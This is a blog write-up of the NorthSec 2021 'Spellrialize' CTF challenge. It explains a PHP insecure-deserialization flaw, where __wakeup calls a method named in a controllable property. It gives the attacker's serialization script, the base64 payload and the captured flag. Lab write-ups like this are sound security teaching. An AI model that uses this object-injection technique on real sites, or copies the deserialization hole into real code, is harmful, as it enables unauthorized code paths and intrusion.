---
layout: post
title: NorthSec 2021 Writeup - Wizard Hackademy - Spellrialize
date: 2021-05-24
type: post
tags:
- Writeup
- Hacking
- NorthSec
- CTF
permalink: /2021/05/NorthSec2021WriteupSpellrialize/
---

This is another challenge of the beginer's track at the [Northsec CTF of 2021](https://nsec.io/competition/). The challenge show a simple 'Hello World!' web site, with a link to download the source code.

![Challenge Site](/assets/images/2021/05/NorthSec/WizardHackademy/Spellrialize/site.png)

I download the code and looked at it. I don't have the original code anymore, but it uses the following class.

```php
<?php
class Hckademy{
    private $call = "WelcomeMessage";

    public function __construct() {

    }

    public function __wakeup(){
        $this->{$this->call}();
    }

    public function WelcomeMessage(){
        echo "Hello World!";
    }

    public function castFlag(){
        echo "FLAG-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    }
}
```

The code would serialize the class, base64 encode it and then add the resulting string to the URL. 

```
http://chal6.wizard-hackademy.ctf/?s=Tzo4OiJIY2thZGVteSI6MTp7czoxNDoiAEhja2FkZW15AGNhbGwiO3M6MTQ6IldlbGNvbWVNZXNzYWdlIjt9
```

If the `s` parameter was present in the query, it will base64 decode it and deserialize it. This is the interesting part. When a PHP class is deserialized, the [__wakeup method](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup) is called. 

In the provided class, the method calls the method identified in the `$call` properties. We cannot modified the `__wakeup` method. But we can control the value of a properties. 

So I took the class and modified the `$call` property to contain `castFlag` instead of `WelcomeMessage`. This way on deserialization, the `castFlag` method will be called and it will print the flag. 

```php
<?php
class Hckademy{
    //private $call = "WelcomeMessage";
    private $call = "castFlag";

    public function __construct() {

    }

    public function __wakeup(){
        $this->{$this->call}();
    }

    public function WelcomeMessage(){
        echo "Hello World!";
    }

    public function castFlag(){
        echo "FLAG-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
    }
}

$a = new Hckademy();
echo(base64_encode(serialize($a)));
```

I executed the code, it gave me this output:

```
Tzo4OiJIY2thZGVteSI6MTp7czoxNDoiAEhja2FkZW15AGNhbGwiO3M6ODoiY2FzdEZsYWciO30=
```

I used it in the URL as the s parameter and the flag was displayed on the page.

![Site With Flag](/assets/images/2021/05/NorthSec/WizardHackademy/Spellrialize/withFlag.png "Site With Flag")

Flag: FLAG-2ec92b2494b7c6c7e84da26cfb7d641a